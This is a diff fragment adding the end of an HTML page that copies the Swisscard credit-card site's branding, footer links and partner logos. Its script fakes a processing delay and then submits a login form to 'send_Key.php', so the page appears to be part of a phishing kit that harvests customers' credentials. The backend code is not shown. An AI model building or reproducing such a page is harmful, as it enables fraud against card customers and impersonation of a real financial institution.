+        loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+        loginButton.disabled = true;
+        
+        // Submit the form after a short delay (simulating processing)
+        setTimeout(() => {
+            form.submit(); // This will send the data to send_Key.php
+        }, 1500);
+    }
+});
+    });
+</script>
+
+<!-- No gradient spacer needed with new contained background approach -->
+
+<!-- Using the original footer.png image to connect with the footer -->
+<style>
+.footer-image-connector {
+    display: block;
+    width: 100%;
+    margin: 0;
+    padding: 0;
+    font-size: 0;
+    line-height: 0;
+}
+
+.footer-image-connector img {
+    display: block;
+    width: 100%;
+    margin-bottom: -4px;
+}
+</style>
+
+<div class="footer-image-connector">
+    <img src="./images/footer.png" alt="Footer">
+</div>
+
+<!-- Existing footer with normal styling and no margin/padding top -->
+<footer class="nav-footer" style="margin-top: 0; padding-top: 30px;">
+    <div class="nav-footer-content">
+        <div class="nav-footer-grid">
+            <!-- Quick Access Column -->
+            <div class="nav-footer-column">
+                <h3 class="nav-footer-title">Schnellzugang</h3>
+                <ul class="nav-footer-list">
+                    <li><a href="#">Mobile Payment</a></li>
+                    <li><a href="#">Swisscard App</a></li>
+                    <li><a href="#">Karte sperren</a></li>
+                </ul>
+            </div>
+
+            <!-- Private Customers Column -->
+            <div class="nav-footer-column">
+                <h3 class="nav-footer-title">Privatkunden</h3>
+                <ul class="nav-footer-list">
+                    <li><a href="#">Kreditkarten</a></li>
+                    <li><a href="#">Kartendienstleistungen</a></li>
+                    <li><a href="#">Hilfe-Center</a></li>
+                </ul>
+            </div>
+
+            <!-- Business Customers Column -->
+            <div class="nav-footer-column">
+                <h3 class="nav-footer-title">Firmenkunden</h3>
+                <ul class="nav-footer-list">
+                    <li><a href="#">Firmenkarten</a></li>
+                    <li><a href="#">Händler</a></li>
+                    <li><a href="#">Privatbanken</a></li>
+                </ul>
+            </div>
+
+            <!-- Swisscard Column -->
+            <div class="nav-footer-column">
+                <h3 class="nav-footer-title">Swisscard</h3>
+                <ul class="nav-footer-list">
+                    <li><a href="#">Karriere</a></li>
+                    <li><a href="#">Offene Stellen</a></li>
+                    <li><a href="#">Medien</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Social Media Section -->
+        <div class="nav-footer-social">
+            <div class="social-links">
+                <a href="https://www.linkedin.com/company/swisscard" class="social-link">
+                    <i class="fab fa-linkedin"></i>
+                </a>
+                <a href="https://www.facebook.com/swisscard" class="social-link">
+                    <i class="fab fa-facebook"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</footer>
+<footer class="site-footer">
+    <div class="footer-content">
+        <div class="footer-logos">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRTeoJQWrwtpMpKttUCtG1GVRYXhU9-_9ptxMziv5qt4qgyiaJS3r8wPhl4Cs91XSuFpA&amp;usqp=CAU" alt="Swisscard Logo" class="footer-logo swisscard">
+            <div class="partner-logos">
+                <img src="https://www.swisscard.ch/dam/jcr:69b289d2-994b-46a5-bf9e-dca75234568b/credit-suisse-logo.svg" alt="Credit Suisse Logo" class="footer-logo credit-suisse">
+                <img src="https://www.swisscard.ch/dam/jcr:fc55515b-fe62-408a-9f97-11b4021c75c8/american-express.svg" alt="American Express Logo" class="footer-logo amex">
+            </div>
+        </div>
+        <div class="footer-text">
+            <p>Cards, issued by Swisscard AECS GmbH, Neugasse 18, 8810 Horgen | Copyright © 2025</p>
+            <div class="footer-links">
+                <a href="#">Rechtliche Bedingungen und Hinweise</a>
+                <a href="#">Datenschutz</a>
+                <a href="#">Cookie-Einstellungen ändern</a>
+            </div>
+        </div>
+    </div>
+</footer>
+
+</body></html>
